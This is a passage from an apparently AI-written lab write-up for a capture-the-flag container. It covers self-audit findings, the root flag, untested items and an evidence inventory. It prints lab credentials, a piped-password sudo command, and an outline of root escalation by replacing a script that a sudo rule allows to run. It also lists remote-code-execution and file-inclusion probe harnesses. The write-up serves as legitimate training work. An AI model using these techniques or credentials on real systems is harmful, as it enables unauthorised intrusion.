+<p><strong>Class.</strong> A work count derived from retained evidence measures <strong>what I happened to save</strong>, not <strong>what I did</strong>. The two diverge silently, and they diverge <em>downward</em>, which is the direction that makes a thin engagement look rigorous.</p>
+<p><strong>Fix applied.</strong> <code>evidence/tunnel_request_accounting.txt</code> records the full reconstructed 12-call log with an explicit archived/not-archived column and states plainly that the 12 is reconstructed from the transcript rather than from the artefacts.</p>
+<h3 id="i6--my-first-sudo--n--l-control-returned-a-message-that-reads-like-success">I6 — My first <code>sudo -n -l</code> control returned a message that reads like success</h3>
+<p><strong>Defect.</strong> <code>sudo -n -l</code> as <code>peter</code> returned <code>sudo: a password is required</code> with exit 1. Read alone, that is easy to misread as &quot;peter has sudo and it wants a password&quot; — the opposite of the truth.</p>
+<p><strong>What it would have caused me to file.</strong> Either a wasted credential attack on peter's sudo, or an invented finding that peter has partial sudo.</p>
+<p><strong>Class.</strong> Instrument returning an exit code and a generic message where the discriminating information lives elsewhere.</p>
+<p><strong>Fix applied.</strong> Re-ran with the password (<code>echo sp1der | sudo -S -l</code>), which returned the discriminating line: <code>Sorry, user peter may not run sudo on 6e865442bcaf.</code> That is what the writeup cites.</p>
+<h3 id="i7--my-known-positive-control-pointed-at-the-wrong-file">I7 — My &quot;known positive&quot; control pointed at the wrong file</h3>
+<p><strong>Defect.</strong> To prove the passwd-leak detector could fire, I ran <code>grep -c 'root:x:0:0'</code> against <code>backup_opt_spidy_verify.txt</code> — which is <code>spidy.py</code>, and contains no such string. It returned <strong>0</strong>. If I had stopped there, the correct conclusion would have rested on a detector with no working demonstration.</p>
+<p><strong>What it would have caused me to file.</strong> Nothing directly, but it nearly left the &quot;LFI does not leak <code>/etc/passwd</code>&quot; negative resting on an unproven detector — precisely the failure mode the whole corpus is about.</p>
+<p><strong>Class.</strong> Control miswiring. A positive control is only evidence if it is fed a genuinely positive sample.</p>
+<p><strong>Fix applied.</strong> Re-ran against an actual copy of <code>/etc/passwd</code> → <strong>1 match</strong>. Only then were L2–L6 read as 0. The negative is now earned: same detector, same command, 1 on the positive and 0 on each negative.</p>
+<h3 id="i8--cosmetic-a-tooling-wrapper-name-leaked-into-the-target">I8 — Cosmetic: a tooling wrapper name leaked into the target</h3>
+<p><strong>Defect.</strong> Several early reads failed with <code>exec: &quot;rtk&quot;: executable file not found in $PATH</code> because I passed my host-side command wrapper into <code>docker exec</code>, where it does not exist. No target-side effect; the reads were simply retried with plain commands.</p>
+<p><strong>Class.</strong> Host/tool boundary confusion — the wrapper is a host convenience, not a binary in the image.</p>
+<hr />
+<h2 id="6-reward">6. Reward</h2>
+<p>There is <strong>no <code>FLAG{…}</code> token</strong> in this lab. The reward is the file <code>/root/flag.txt</code>, readable only as <code>uid=0(root)</code>. Its complete content, reproduced verbatim from <code>evidence/flag_exact.txt</code> (33 lines, extracted from <code>evidence/privesc_run.txt</code> between the <code>FLAG-BEGIN</code> and <code>FLAG-END</code> markers):</p>
+<pre><code>FLAG-BEGIN
+⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⡏⠀⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⢹⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣰⡟⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⢻⣆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣿⠁⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠈⣿⡆⠀⠀⠀⠀
+⠀⠀⠀⠀⣾⡇⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⢸⣿⠀⠀⠀⠀
+⠀⠀⠀⢸⣿⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⠀⠀⣿⡇⠀⠀⠀
+⠀⠀⠀⣿⣿⠀⠀⣿⣿⣧⣤⣤⣤⣤⣤⣤⡀⠀⣀⠀⠀⣀⠀⢀⣤⣤⣤⣤⣤⣤⣼⣿⣿⠀⠀⣿⣿⠀⠀⠀
+⠀⠀⢸⣿⡏⠀⠀⠀⠙⢉⣉⣩⣴⣶⣤⣙⣿⣶⣯⣦⣴⣼⣷⣿⣋⣤⣶⣦⣍⣉⡉⠋⠀⠀⠀⢸⣿⡇⠀⠀
+⠀⠀⢿⣿⣷⣤⣶⣶⠿⠿⠛⠋⣉⡉⠙⢛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⢉⣉⠙⠛⠿⠿⣶⣶⣤⣾⣿⡿⠀⠀
+⠀⠀⠀⠙⠻⠋⠉⠀⠀⠀⣠⣾⡿⠟⠛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠻⢿⣷⣄⠀⠀⠀⠉⠙⠟⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠋⢀⣠⣾⠟⢫⣿⣿⣿⣿⣿⣿⡍⠻⣷⣄⡀⠙⠿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣴⡿⠛⠁⠀⢸⣿⣿⠋⠀⢸⣿⣿⣿⣿⣿⣿⡗⠀⠙⣿⣿⡇⠀⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀
+⢀⠀⣀⣴⣾⠟⠋⠀⠀⠀⠀⢸⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠙⠻⣷⣦⣀⠀⣀
+⢸⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⡟
+⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⢹⣿⣿⣿⣿⡏⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇
+⢸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⢿⣿⣿⡿⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇
+⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠈⠿⠿⠁⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
+⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀
+⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀
+⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣾⠏⠀⠀
+⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀
+⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⠀⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+Grooti16
+
+FLAG-END
+</code></pre>
+<p>It is a braille-art rendering of the Spider-Man insignia with the signature <code>Grooti16</code> beneath it.</p>
+<p>Provenance chain for that read: <code>uid=0(root)</code> was printed by the replacement script's own <code>id</code> call under <code>sudo -n /usr/bin/python3 /opt/spidy.py</code>, in the same process that opened <code>/root/flag.txt</code>. Not inferred from a directory listing, and not carried over from a prior session.</p>
+<p><strong>Why I assert the absence of a <code>FLAG{}</code> wrapper without a token sweep:</strong> I did not run an exhaustive search for the literal string <code>FLAG{</code> across the filesystem, so I make no claim that it appears nowhere on this image. What I can state positively is what the reward <em>is</em> and where it came from. If the corpus index expects a <code>FLAG{}</code>-shaped column for this lab, this row should carry the file path <code>/root/flag.txt</code> and the signature <code>Grooti16</code> instead. Filing &quot;no <code>FLAG{}</code> exists&quot; on the strength of the reward's <em>shape</em> alone would be exactly the unearned negative this corpus exists to catch.</p>
+<hr />
+<h2 id="7-not-tested">7. NOT tested</h2>
+<p>Each has a reason, not an excuse.</p>
+<table>
+<thead>
+<tr>
+<th>Not tested</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>UDP plane</strong></td>
+<td>No UDP listener and no UDP service is claimed by the manifest. <strong>Coverage gap:</strong> I did not scan UDP from outside. <code>/proc/net/udp</code> and <code>/proc/net/udp6</code> inside the container would settle it and are the cheap next check; I did not run them for this lab, so the UDP negative is <strong>untested, not earned</strong>.</td>
+</tr>
+<tr>
+<td><strong>The other two recovered credentials</strong> (<code>miles/m0ral3s</code>, <code>gwen/gw3n2025</code>)</td>
+<td>Unnecessary once <code>peter</code> yielded the tunnel. Both accounts exist in <code>/etc/passwd</code> as <code>miles</code>/<code>gwen</code> with no local entry beyond images and web content — but I did <strong>not</strong> test SSH login with either, so their reachability is untested, not denied.</td>
+</tr>
+<tr>
+<td><strong>Credential-campaign rate ladder</strong></td>
+<td>Not needed: credentials were <strong>disclosed by the target</strong>, so there was no guessing to rate-limit. Zero authentication attempts were made against SSH beyond the three successful logins.</td>
+</tr>
+<tr>
+<td><strong>Root SSH login</strong></td>
+<td><code>sshd -T</code> reports <code>permitrootlogin without-password</code> and <code>/etc/shadow</code> shows the root hash field as <code>*</code>. Both were read, not attacked. No root SSH attempt was made.</td>
+</tr>
+<tr>
+<td><strong>LFI against the 4 other in-universe <code>.php</code> files</strong></td>
+<td><code>html/index.php</code> (self-include, infinite recursion), <code>heroes.php</code>, <code>contact.php</code> — all inside the docroot and reachable by plain name without traversal. No information gain.</td>
+</tr>
+<tr>
+<td><strong>LFI against files outside the 5-file universe</strong></td>
+<td>The <code>.php</code> suffix at <code>:94</code> makes them unreachable; the bounded <code>find</code> established the ceiling at 5 files. Testing further would be enumerating a set already proven closed.</td>
+</tr>
+<tr>
+<td><strong>Argument injection on the sudo rule</strong></td>
+<td>The rule pins <code>/usr/bin/python3 /opt/spidy.py</code> exactly. The intended path (directory replacement) succeeded, so no argument-manipulation variant was tried. The rule's exact-match behaviour is therefore inferred from the successful single-argument run, not measured.</td>
+</tr>
+<tr>
+<td><strong>PHP session-file LFI</strong></td>
+<td>Gated, not skipped: <strong>0</strong> occurrences of <code>session_start</code>/<code>$_SESSION</code>/<code>session_id</code> in <code>/var/www/</code>, and <strong>0</strong> files in <code>/var/lib/php/sessions</code> (which is nonetheless mode <code>1777</code>). Since the app never starts a session, no session file can ever exist to poison.</td>
+</tr>
+<tr>
+<td><strong>Other web frameworks / hidden routes</strong></td>
+<td><code>autoindex</code> is loaded but no directory indexes were reachable; the bounded <code>.php</code> sweep is the authoritative file inventory for this image.</td>
+</tr>
+<tr>
+<td><strong>Anything requiring the removed artefacts</strong></td>
+<td>All probe files were deleted; their behaviour under repeat runs is not re-verified beyond the benign <code>sudo</code> sanity check.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-evidence-inventory">8. Evidence inventory</h2>
+<p>All under <code>[lab-home]/[corpus-repo]/corpus/169/evidence/</code>. Every file is obtainable by a reader of this repository; nothing is cited that is not listed here.</p>
+<p><strong>Harnesses (re-runnable)</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ssh_run.py</code></td>
+<td>Runs one command over SSH with a supplied credential; prints stdout/stderr/exit. Used for hops 2 and the <code>sudo -S -l</code> control.</td>
+</tr>
+<tr>
+<td><code>tunnel_probe.py</code></td>
+<td>Opens the SSH local forward and fires CONTROL-1/2/3 through it, refusing to trust any 8080 claim unless the oracle is green both ways. Writes <code>tunnel_evidence.txt</code>.</td>
+</tr>
+<tr>
+<td><code>rce.py</code></td>
+<td>Runs one command on the 8080 vhost through a fresh tunnel; prints <code>[http=…] [tunnel_requests_this_run=…]</code> and strips the page chrome to just the <code>system()</code> output.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Primary evidence</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>waf_bypass.html</code></td>
+<td>Full response to the bypass POST — the disclosure table as returned.</td>
+</tr>
+<tr>
+<td><code>creds_recovered.txt</code></td>
+<td>The three extracted <code>User: … Pass: …</code> lines.</td>
+</tr>
+<tr>
+<td><code>ssh_peter_id.txt</code></td>
+<td><code>id; hostname; whoami</code> as peter — the identity witness.</td>
+</tr>
+<tr>
+<td><code>peter_sudo.txt</code></td>
+<td><code>Sorry, user peter may not run sudo on 6e865442bcaf.</code></td>
+</tr>
+<tr>
+<td><code>tunnel_evidence.txt</code></td>
+<td>All three tunnel control responses in full, with the work count.</td>
+</tr>
+<tr>
+<td><code>rce_identity.txt</code></td>
+<td><code>uid=33(www-data) … groups=33(www-data),1002(spiderlab)</code>.</td>
+</tr>
+<tr>
+<td>`rce_sudo_l.txt**</td>
+<td><code>sudo -n -l</code> as www-data — the exact grant.</td>
+</tr>
+<tr>
+<td><code>privesc_run.txt</code></td>
+<td><code>rm_rc=0 write_rc=0</code>, then the sudo run: <code>uid=0(root)</code>, <code>FLAG-BEGIN</code>…<code>FLAG-END</code>.</td>
+</tr>
+<tr>
+<td><code>backup_opt_spidy_verify.txt</code></td>
+<td>The 808-byte original <code>/opt/spidy.py</code>, used as the restore reference.</td>
+</tr>
+<tr>
+<td><code>backup_opt_spidy_raw.txt</code></td>
+<td>The same file fetched over RCE, for independent comparison.</td>
+</tr>
+<tr>
+<td><code>privesc_payload.py</code></td>
+<td>The replacement script that ran as root (read-only: prints its own <code>id</code>, then reads the flag).</td>
+</tr>
+<tr>
+<td><code>payload.b64</code> / <code>original.b64</code></td>
+<td>Base64 of payload and original, as transferred.</td>
+</tr>
+<tr>
+<td><code>restore_run.txt</code></td>
+<td><code>RESTORED</code> from the restore command.</td>
+</tr>
+<tr>
+<td><code>tunnel_request_accounting.txt</code></td>
+<td>The reconstructed 12-call tunnel log with archived/not-archived status, and the note on why the automated count was 8.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>LFI probes</strong> — <code>l2.txt</code>, <code>l3.txt</code>, <code>l4.txt</code>, <code>l5.txt</code>, <code>l6.txt</code> (the five LFI responses; sizes 2561/2561/2561/<strong>4927</strong>/2561), plus <code>php_files_all.txt</code> (the bounded 5-file <code>.php</code> universe), <code>idx.html</code> and <code>mv.html</code> (baseline index and multiverse bodies used for the &quot;no PHP warning in the body&quot; claim).</p>
+<p><strong>Restoration record</strong> — final <code>/opt</code> state is <code>drwxr-xr-x root spiderlab</code>, containing only <code>-rwxr--r-- root root 808 spidy.py</code>, content byte-identical to <code>backup_opt_spidy_verify.txt</code>, verified by <code>diff</code>, <code>stat</code>, and a benign <code>sudo</code> execution of the restored original.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
